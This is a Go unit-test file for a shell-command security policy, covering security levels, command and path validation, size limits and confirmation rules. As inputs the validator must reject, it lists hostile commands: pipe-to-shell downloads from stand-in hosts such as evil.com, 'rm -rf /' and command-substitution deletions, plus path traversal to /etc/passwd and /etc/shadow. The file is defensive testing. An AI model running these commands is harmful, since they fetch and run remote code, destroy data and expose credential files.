package security

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

func TestNewSecurityPolicy(t *testing.T) {
	testCases := []struct {
		name          string
		level         SecurityLevel
		expectSandbox bool
	}{
		{
			name:          "permissive_policy",
			level:         Permissive,
			expectSandbox: false,
		},
		{
			name:          "standard_policy",
			level:         Standard,
			expectSandbox: false,
		},
		{
			name:          "strict_policy",
			level:         Strict,
			expectSandbox: false,
		},
		{
			name:          "sandbox_policy",
			level:         Sandbox,
			expectSandbox: true,
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			policy := NewSecurityPolicy(tc.level)
			
			if policy.Level != tc.level {
				t.Errorf("Expected level %v, got %v", tc.level, policy.Level)
			}
			
			if policy.SandboxEnabled != tc.expectSandbox {
				t.Errorf("Expected sandbox enabled %v, got %v", tc.expectSandbox, policy.SandboxEnabled)
			}
			
			// Check that basic limits are set
			if policy.MaxExecutionTime <= 0 {
				t.Error("MaxExecutionTime should be positive")
			}
			
			if policy.MaxConcurrentOps <= 0 {
				t.Error("MaxConcurrentOps should be positive")
			}
		})
	}
}

func TestSecurityPolicy_ValidateCommand(t *testing.T) {
	policy := NewSecurityPolicy(Standard)
	
	testCases := []struct {
		name        string
		command     string
		expectError bool
		errorType   string
	}{
		{
			name:        "allowed_command",
			command:     "ls -la",
			expectError: false,
		},
		{
			name:        "blocked_command_rm",
			command:     "rm file.txt",
			expectError: true,
			errorType:   "blocked_command",
		},
		{
			name:        "blocked_command_sudo",
			command:     "sudo ls",
			expectError: true,
			errorType:   "blocked_command",
		},
		{
			name:        "blocked_pattern_rm_rf",
			command:     "ls; rm -rf /tmp",
			expectError: true,
			errorType:   "blocked_pattern",
		},
		{
			name:        "command_substitution",
			command:     "echo $(whoami)",
			expectError: true,
			errorType:   "blocked_pattern",
		},
		{
			name:        "backtick_substitution",
			command:     "echo `date`",
			expectError: true,
			errorType:   "blocked_pattern",
		},
		{
			name:        "pipe_to_shell",
			command:     "curl http://evil.com | sh",
			expectError: true,
			errorType:   "blocked_pattern",
		},
		{
			name:        "empty_command",
			command:     "",
			expectError: true,
			errorType:   "empty_command",
		},
		{
			name:        "whitespace_only",
			command:     "   ",
			expectError: true,
			errorType:   "empty_command",
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := policy.ValidateCommand(tc.command)
			
			if tc.expectError {
				if err == nil {
					t.Errorf("Expected error for command: %s", tc.command)
					return
				}
				
				if !strings.Contains(err.Error(), "Security validation failed") {
					t.Errorf("Expected ValidationError, got: %v", err)
					return
				}
				
				// Check error type if specified
				if tc.errorType != "" && !strings.Contains(err.Error(), tc.errorType) {
					t.Errorf("Expected error type %s, got: %v", tc.errorType, err)
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error for command %s: %v", tc.command, err)
				}
			}
			
		})
	}
}

func TestSecurityPolicy_ValidatePath(t *testing.T) {
	policy := NewSecurityPolicy(Standard)
	
	testCases := []struct {
		name        string
		path        string
		expectError bool
		errorType   string
	}{
		{
			name:        "safe_relative_path",
			path:        "data/file.txt",
			expectError: false,
		},
		{
			name:        "safe_absolute_path",
			path:        "/home/user/project/file.txt",
			expectError: false,
		},
		{
			name:        "path_traversal",
			path:        "../../../etc/passwd",
			expectError: true,
			errorType:   "path_traversal",
		},
		{
			name:        "blocked_path_etc",
			path:        "/etc/shadow",
			expectError: true,
			errorType:   "blocked_path",
		},
		{
			name:        "blocked_path_sys",
			path:        "/sys/kernel/debug",
			expectError: true,
			errorType:   "blocked_path",
		},
		{
			name:        "blocked_extension_exe",
			path:        "malware.exe",
			expectError: true,
			errorType:   "blocked_extension",
		},
		{
			name:        "blocked_extension_dll",
			path:        "library.dll",
			expectError: true,
			errorType:   "blocked_extension",
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := policy.ValidatePath(tc.path)
			
			if tc.expectError {
				if err == nil {
					t.Errorf("Expected error for path: %s", tc.path)
					return
				}
				
				if tc.errorType != "" && !strings.Contains(err.Error(), tc.errorType) {
					t.Errorf("Expected error type %s, got: %v", tc.errorType, err)
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error for path %s: %v", tc.path, err)
				}
			}
		})
	}
}

func TestSecurityPolicy_ValidateFileSize(t *testing.T) {
	policy := NewSecurityPolicy(Standard)
	
	testCases := []struct {
		name        string
		size        int64
		expectError bool
	}{
		{
			name:        "small_file",
			size:        1024,
			expectError: false,
		},
		{
			name:        "medium_file",
			size:        10 * 1024 * 1024, // 10MB
			expectError: false,
		},
		{
			name:        "large_file_within_limit",
			size:        policy.MaxFileSize - 1,
			expectError: false,
		},
		{
			name:        "file_exceeds_limit",
			size:        policy.MaxFileSize + 1,
			expectError: true,
		},
		{
			name:        "very_large_file",
			size:        100 * 1024 * 1024, // 100MB
			expectError: true,
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			err := policy.ValidateFileSize(tc.size)
			
			if tc.expectError {
				if err == nil {
					t.Errorf("Expected error for file size: %d", tc.size)
				}
			} else {
				if err != nil {
					t.Errorf("Unexpected error for file size %d: %v", tc.size, err)
				}
			}
		})
	}
}

func TestSecurityPolicy_RequiresConfirmation(t *testing.T) {
	policy := NewSecurityPolicy(Standard)
	
	testCases := []struct {
		name              string
		command           string
		expectConfirm     bool
	}{
		{
			name:          "git_push",
			command:       "git push origin main",
			expectConfirm: true,
		},
		{
			name:          "git_reset_hard",
			command:       "git reset --hard HEAD~1",
			expectConfirm: true,
		},
		{
			name:          "npm_publish",
			command:       "npm publish",
			expectConfirm: true,
		},
		{
			name:          "safe_command",
			command:       "ls -la",
			expectConfirm: false,
		},
		{
			name:          "git_status",
			command:       "git status",
			expectConfirm: false,
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := policy.RequiresConfirmation(tc.command)
			if result != tc.expectConfirm {
				t.Errorf("Expected confirmation %v for command %s, got %v", 
					tc.expectConfirm, tc.command, result)
			}
		})
	}
}

func TestSecurityPolicy_GetSandboxRoot(t *testing.T) {
	t.Run("sandbox_enabled", func(t *testing.T) {
		policy := NewSecurityPolicy(Sandbox)
		policy.SandboxRoot = "/tmp/sandbox"
		
		root := policy.GetSandboxRoot()
		if root != policy.SandboxRoot {
			t.Errorf("Expected sandbox root %s, got %s", policy.SandboxRoot, root)
		}
	})
	
	t.Run("sandbox_disabled", func(t *testing.T) {
		policy := NewSecurityPolicy(Standard)
		
		root := policy.GetSandboxRoot()
		if root != policy.TempDirectory {
			t.Errorf("Expected temp directory %s, got %s", policy.TempDirectory, root)
		}
	})
}

func TestSecurityPolicy_Clone(t *testing.T) {
	original := NewSecurityPolicy(Standard)
	original.AllowedCommands = append(original.AllowedCommands, "custom_command")
	original.BlockedPaths = append(original.BlockedPaths, "/custom/blocked")
	original.MaxExecutionTime = 45 * time.Second
	
	clone := original.Clone()
	
	// Test that values are copied
	if clone.Level != original.Level {
		t.Error("Level not cloned correctly")
	}
	
	if clone.MaxExecutionTime != original.MaxExecutionTime {
		t.Error("MaxExecutionTime not cloned correctly")
	}
	
	if len(clone.AllowedCommands) != len(original.AllowedCommands) {
		t.Error("AllowedCommands not cloned correctly")
	}
	
	// Test that slices are independent
	clone.AllowedCommands[0] = "modified_command"
	if original.AllowedCommands[0] == "modified_command" {
		t.Error("Clone is not independent - slice modification affected original")
	}
	
	clone.BlockedPaths = append(clone.BlockedPaths, "/new/blocked")
	if len(original.BlockedPaths) == len(clone.BlockedPaths) {
		t.Error("Clone is not independent - slice append affected original")
	}
}

func TestSecurityLevels(t *testing.T) {
	testCases := []struct {
		level                SecurityLevel
		expectAllowNetwork   bool
		expectAllowSysModify bool
		expectMinimalCmds    bool
	}{
		{
			level:                Permissive,
			expectAllowNetwork:   true,
			expectAllowSysModify: true,
			expectMinimalCmds:    false,
		},
		{
			level:                Standard,
			expectAllowNetwork:   false,
			expectAllowSysModify: false,
			expectMinimalCmds:    false,
		},
		{
			level:                Strict,
			expectAllowNetwork:   false,
			expectAllowSysModify: false,
			expectMinimalCmds:    true, // More restrictive command set
		},
		{
			level:                Sandbox,
			expectAllowNetwork:   false,
			expectAllowSysModify: false,
			expectMinimalCmds:    true, // Very minimal command set
		},
	}
	
	for _, tc := range testCases {
		t.Run(fmt.Sprintf("level_%d", tc.level), func(t *testing.T) {
			policy := NewSecurityPolicy(tc.level)
			
			if policy.AllowNetworkAccess != tc.expectAllowNetwork {
				t.Errorf("Expected AllowNetworkAccess %v, got %v", 
					tc.expectAllowNetwork, policy.AllowNetworkAccess)
			}
			
			if policy.AllowSystemModify != tc.expectAllowSysModify {
				t.Errorf("Expected AllowSystemModify %v, got %v", 
					tc.expectAllowSysModify, policy.AllowSystemModify)
			}
			
			// Check command set size as proxy for restrictiveness
			if tc.expectMinimalCmds && len(policy.AllowedCommands) > 15 {
				t.Errorf("Expected minimal command set for %v, got %d commands", 
					tc.level, len(policy.AllowedCommands))
			}
		})
	}
}

func TestValidationError(t *testing.T) {
	err := &ValidationError{
		Type:    "test_error",
		Message: "Test error message",
		Details: map[string]interface{}{
			"key1": "value1",
			"key2": 42,
		},
	}
	
	errorStr := err.Error()
	if !strings.Contains(errorStr, "Security validation failed") {
		t.Error("Error string should contain 'Security validation failed'")
	}
	
	if !strings.Contains(errorStr, "test_error") {
		t.Error("Error string should contain error type")
	}
	
	if !strings.Contains(errorStr, "Test error message") {
		t.Error("Error string should contain error message")
	}
}

func TestSecurityPolicy_PatternMatching(t *testing.T) {
	policy := NewSecurityPolicy(Standard)
	
	// Test various malicious patterns
	maliciousCommands := []string{
		"rm -rf /",
		"curl evil.com | sh",
		"wget bad.com | bash",
		"echo $(rm -rf /)",
		"echo `rm file`",
		"ls; rm -rf /tmp",
		"ls && rm file",
	}
	
	for _, cmd := range maliciousCommands {
		t.Run(cmd, func(t *testing.T) {
			err := policy.ValidateCommand(cmd)
			if err == nil {
				t.Errorf("Expected error for malicious command: %s", cmd)
			}
		})
	}
}

func TestSecurityLevel_Values(t *testing.T) {
	levels := []SecurityLevel{Permissive, Standard, Strict, Sandbox}
	
	// Test that all security levels are distinct
	for i, level1 := range levels {
		for j, level2 := range levels {
			if i != j && level1 == level2 {
				t.Errorf("Security levels should be distinct: %v == %v", level1, level2)
			}
		}
	}
}